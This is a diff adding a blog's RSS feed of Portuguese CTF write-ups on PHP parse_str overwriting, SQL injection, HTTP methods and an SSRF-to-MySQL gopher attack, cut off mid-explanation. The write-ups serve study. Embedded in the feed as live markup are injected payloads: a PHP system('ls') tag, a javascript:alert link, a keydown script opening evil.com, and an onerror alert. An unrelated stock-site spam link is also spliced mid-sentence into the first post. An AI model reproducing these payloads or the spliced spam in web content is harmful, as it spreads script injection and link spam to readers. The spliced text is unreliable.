@@ -1,0 +1,659 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>m&lt;&gt;4k&apos;4&quot;br0</title>
+    <description>Web Application Security Researcher &apos;at &apos;Flipside and CTF Player at FireShell Security Team ;) &lt;?php system(&apos;ls&apos;);?&gt;&apos;</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Thu, 01 Dec 2022 15:19:50 +0300</pubDate>
+    <lastBuildDate>Thu, 01 Dec 2022 15:19:50 +0300</lastBuildDate>
+    <generator>Jekyll v4.3.1</generator>
+    
+      <item>
+        <title>Tokyo Westerns CTF - SimpleAuth Writeup</title>
+        <description>&lt;p&gt;Essa challenge quando peguei ela &lt;a href=&quot;https://coindataflow.com/de/aktie/SEOVF&quot;&gt;&lt;img class=&quot;cdf&quot; src=&quot;cdf.svg&quot; alt=&quot;sernova coindataflow&quot;&gt;&lt;/a&gt;, eu não sabia nem a sua descrição &lt;/p&gt;, mas eu gosto muito desse tipo de desafio do qual nos mostra o código fonte e não foi tão demorado para matar essa challenge.&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/zvsZqHA.png&quot;&gt;
+&lt;p&gt;Analisando por cima o código, podemos ver que ele recebe os parametros via &lt;code&gt;$_SERVER[&apos;QUERY_STRING&apos;]&lt;/code&gt; e cria uma variavel &lt;code&gt;action&lt;/code&gt; para separar aquilo que vem do &lt;code&gt;parse_str()&lt;/code&gt; &lt;/p&gt;
+&lt;p&gt;Um pouco mais para baixo, temos algumas verificações sendo feitas, enviando um get com o valor de &quot;auth&quot;, entramos dentro da condição que precisamos para resolver o desafio.&lt;/p&gt;
+&lt;p&gt;A partir deste momento, temos 3 &quot;if&apos;s&quot;, dos quais na verdade não servem para nada, porém, temos a varivel &lt;code&gt;$hashed_password&lt;/code&gt; que é usada no ultimo if para verificar o seu valor e nos entregar a flag!&lt;/p&gt;
+&lt;p&gt;A real intenção do desafio era explorar o &lt;code&gt;parse_str()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Fazendo um pequeno teste, podemos ver que usando o &lt;code&gt;parse_str()&lt;/code&gt; para pegar um valor já antes setado, fará com que este valor seja sobreescrito&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;  &lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;xxxxx&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;parse_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;QUERY_STRING&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$var&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;img src=&quot;https://i.imgur.com/GTrRI2W.png&quot;&gt;
+&lt;a href=javascript:alert(1)&gt;click here&lt;/a&gt;
+&lt;img src=&quot;https://i.imgur.com/OlVQRFH.png&quot;&gt;
+&lt;script&gt;
+onkeydown=function(){
+    window.open(&apos;//evil.com/&apos;,&apos;_blank&apos;,&apos;a&apos;);
+}
+
+onkeypress=function(){
+    window.open(&apos;about:blank&apos;,&apos;_blank&apos;).close();
+}
+&lt;/script&gt;
+&lt;iframe src=teste&gt;&lt;/iframe&gt;
+&lt;!-- &lt;img src=x onerror=alert(1337)&gt; --&gt;
+&lt;p&gt;Enviando via GET o valor, é possivel notar que acontece a sobreescrita dos valores, então, precisamos apenas fazer isso no desafio.&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/YQjGbdb.png&quot;&gt;
+</description>
+        <pubDate>Thu, 09 Aug 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tokyo-westerns/</link>
+        <guid isPermaLink="true">http://localhost:4000/tokyo-westerns/</guid>
+        
+        
+        <category>writeups</category>
+     
+        
+      </item>
+    
+      <item>
+        <title>TJCTF Ess Kyoo Ell - Writeup</title>
+        <description>&lt;p&gt;Está challenge é interessante, as vezes não parece muito realista, mas se levar pelo lado de que cada vez os desenvolvedores tentam deixar tudo mais automatico, ela se encaixa perfeitamente nesse quesito!&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/ByOv3s8.png&quot;&gt;
+&lt;p&gt;No inicio parecia muito um sql injection para bypass de auth, tentei alguns injections simples, como &lt;code&gt;&apos; or 1=1#&lt;/code&gt; e derivados&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/RtVTVug.png&quot;&gt;
+&lt;p&gt;Mas olhando mais atentamente, ele está tentando pegar algo de uma coluna &apos;password&apos; que nem sequer parece existir, se isso estivesse bugado, eles provavelmente ja teriam corrigido, mas na verdade, o que acontece é que os parametros do post são as colunas!&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/zztxytX.png&quot;&gt;
+&lt;p&gt;Fazendo um teste simples, podemos confirmar isso:&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/vdXCOZV.png&quot;&gt;
+&lt;p&gt;Para não confundir o parametro com o seu valor, e deixar o injection na key do parametro, eu usei o encode do &apos;=&apos;, para não ocorrer está confusão internamente:&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/K4tif3T.png&quot;&gt;
+&lt;p&gt;Bem, ficou claro que conseguimos fazer o dump de um usuario, mas, a descrição nos diz que precisamos do ip do adminstrador, então, o que fiz foi tentar procurar pelo user admin pelo injection...&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/vAqpvFW.png&quot;&gt;
+&lt;p&gt;Então, a flag fica tjctf{145.3.1.213}&lt;/p&gt;
+</description>
+        <pubDate>Thu, 09 Aug 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tjctf-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/tjctf-writeup/</guid>
+        
+        
+        <category>writeups</category>
+     
+        
+      </item>
+    
+      <item>
+        <title>TJCTF Request Me - Writeup</title>
+        <description>&lt;p&gt;Este desafio na verdade ele é bem bobo, mas o que é chato, é que ele estava bloquenado o uso do burp suite e do mitmproxy, mas usando o postman é possivel fazer as requests!&lt;/p&gt;
+&lt;p&gt;Inicialmente, tentei fazer tudo direto pelo curl, mas não funcionou, não sei exatamente o porque, mas executei exatamente as mesmas coisas do curl no postman e funcionou&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/5NYBuc0.png&quot;&gt;
+
+&lt;p&gt;Nas primeiras requests a challenge nos induzia a enviar o OPTIONS para ver os métodos aceitos:&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/KjTElM6.png&quot;&gt;
+&lt;p&gt;Dentro do OPTIONS ele nos dizia que haviamos 2 parametros para serem enviados, porém, não se sabia onde, então eu tentei enviar os parametros tanto em GET, como em POST também.&lt;/p&gt;
+&lt;p&gt;Notei que nenhum funcionou, então, testei os dois juntos em outros métodos, até conseguir com o método DELETE:&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/QmixNfh.png&quot;&gt;
+</description>
+        <pubDate>Thu, 09 Aug 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tjctf-request-me-writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/tjctf-request-me-writeup/</guid>
+        
+        
+        <category>writeup</category>
+     
+        
+      </item>
+    
+      <item>
+        <title>ISITDTU CTF Friss - Writeup</title>
+        <description>&lt;p&gt;Está challenge aconteceu este final de semana e eu gostei muito da resolução dela, e também consegui um first blood aqui :) &lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/xpiQ4x4.png&quot;&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/BKL98LX.png&quot;&gt;
+
+&lt;p&gt;Bem, entrando na challenge não tínhamos muita coisa para fazer, haviamos um input e um botão, basicamente indicando que tínhamos um curl sendo executado, a primeira coisa que tentei, foi tentar enviar algo para o google.com e ver se retornava algum valor:&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/x44sNn7.png&quot;&gt;
+&lt;img src=&quot;https://i.imgur.com/6qpAlUX.png&quot;&gt;
+&lt;p&gt;Bem, parece que só podemos enviar coisas para o localhost, então, indo um pouco a fundo, podemos achar um pequeno bypass para isso, já que a aplicação não está barrando wrappers, temos a possibilidade de utilizar o file:// aqui:&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;parse_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;file://localhost/../var/www/html/index.php&quot;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scheme&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nf&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nf&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;path&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nf&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/../var/www/html/index.php&quot;&quot;
+}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/knlEmbs.png&quot;&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/K6IYvF2.png&quot;&gt;
+&lt;br&gt;
+Ok, conseguimos o código da index, vamos dar uma olhada nele:
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;config.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;url&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;url&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;url&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$content_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getUrlContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$content_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;debug&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;show_source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;br&gt;
+&lt;p&gt;Aqui não tem muito o que analisar, pois a função getUrlContent() está vindo muito provavelmente do config.php:&lt;/p&gt;
+&lt;br&gt;
+&lt;img src=&quot;https://i.imgur.com/btOBq77.png&quot;&gt;
+&lt;p&gt;Aqui sim, temos o que analisar:&lt;/p&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$hosts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dbusername&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ssrf_user&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dbpasswd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dbname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ssrf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dbport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3306&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$hosts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dbusername&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dbpasswd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dbname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dbport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;initdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$dbinit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;create table if not exists flag(secret varchar(100));&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mysqli_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dbinit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;safe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$tmpurl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parse_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;PHP_URL_HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmpurl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$tmpurl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tmpurl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;h1&amp;gt;Only access to localhost&amp;lt;/h1&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getUrlContent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;safe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;escapeshellarg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$pl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;curl &quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$pl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nf&quot;&gt;initdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;p&gt;É sempre interessante quando temos usuarios,senhas e etc presentes no código, vamos guardar, pois pode nos ser utíl futuramente.&lt;/p&gt;
+&lt;p&gt;Analisando o initdb() você consegue ver que a função está criando uma tabela chamada flag com uma coluna secret no banco de dados, caso ela ainda não exista...&lt;/p&gt;
+
+&lt;br&gt;
+&lt;p&gt;A função safe() está pegando a url passada e verificando via parse_url() se o host bate com localhost ou 127.0.0.1, nenhuma verificação pesada aqui...&lt;/p&gt;
+&lt;p&gt;Bem, aqui no getUrlContent() eu confesso que cheguei a pensar que havia, talvez, uma nova de bypassar o escapeshellarg e conseguir injetar comandos, porém, não faria sentido algum isso, mas eu pensei nessa possibilidade e perdi muito tempo com isso…&lt;/p&gt;
+&lt;p&gt;Olhando para a função, conseguimos ver que ela está usando o escapeshellarg para criar um escape nos argumentos do comando, logo abaixo é executado um shell_exec e retornado para o usuário.&lt;/p&gt;
+
+&lt;p&gt;Ok, pensando nas possibilidades, ficou muito claro que eu deveria persistir no ssrf, e talvez encontrar algum protocolo disponível do qual eu conseguisse me aproveitar para conseguir uma shell talvez, então tentei ftp://,ssh://,dict:// e então gopher://…&lt;/p&gt;
+
+&lt;img src=&quot;https://i.imgur.com/tSg37dR.png&quot;&gt;
+&lt;p&gt;Eu já havia estudado diversas vezes em formas de conseguir shell com o gopher, usando redis ou fastcgi em conjunto, mas nunca havia feito com mysql, encontrei alguns artigos que me indicaram que uma parte do formato do pacote do mysql, quando enviado na pilha tcp, seria o formato que o mysql entenderia caso pudessemos envia-lo por uma url, bem, é muito abstrato falar assim, vamos ver como isso funciona na prática, porém, antes, vamos criar um usuário igual ao do desafio “ssrf_user” em nosso mysql…&lt;/p&gt;
+
+&lt;pre&gt;
+mysql&gt; CREATE USER &apos;ssrf_user&apos;@&apos;localhost&apos;;
+Query OK, 0 rows affected (0,07 sec)
+
+mysql&gt; GRANT USAGE ON *.* TO &apos;ssrf_user&apos;@&apos;localhost&apos;;
+Query OK, 0 rows affected (0,01 sec)
+
+mysql&gt; GRANT ALL PRIVILEGES *.* TO &apos;ssrf_user&apos;@&apos;localhost&apos;;
+Query OK, 0 rows affected (0,10 sec)
+&lt;/pre&gt;
+&lt;br&gt;
+&lt;p&gt;Ok, agora podemos prosseguir melhor.&lt;/p&gt;
+&lt;p&gt;Vamos abrir o wireshark para ver como o protocolo vai se comportar quando enviarmos um pacote de conexão e login para o mysql:&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/e2pjxmm.png&quot;&gt;
+&lt;p&gt;Eu cheguei a fazer o login pelo mac, mas percebi que o mysql do mac estava gerando de uma forma totalmente diferente da original o pacote de conexão, ele estava grande demais para apenas um login, então, abri um ubuntu com mysql e um wireshark para testar isso, mas basicamente o que precisamos selecionar é o último segmento apresentado do pacote pelo wireshark, que é só a parte do pacote que a gente faz a tentativa de login:&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/d2lTn7s.png&quot;&gt;
+&lt;br&gt;
+&lt;p&gt;A gente basicamente pode dividir essa comunicação do pacote do mysql e duas partes, a parte da conexão e a parte da execução dos comandos, aqui estamos apenas na parte da conexão.&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/zMvBS7c.png&quot;&gt;
+
+&lt;p&gt;A partir daqui, precisamos fazer isso virar uma url, e a forma mais fácil de fazer isso, é usar o input do “Show and save data as” e setar ele para “Raw”:&lt;/p&gt;
+&lt;img src=&quot;https://i.imgur.com/bV97KbV.png&quot;&gt;
+&lt;p&gt;Ok, agora, precisamos encodar isso tudo em um formato adequado para a url, na verdade não é muito difícil, bastaria adicionar % a cada dois bytes, mas eu encontrei um script que faz isso para nós:&lt;/p&gt;
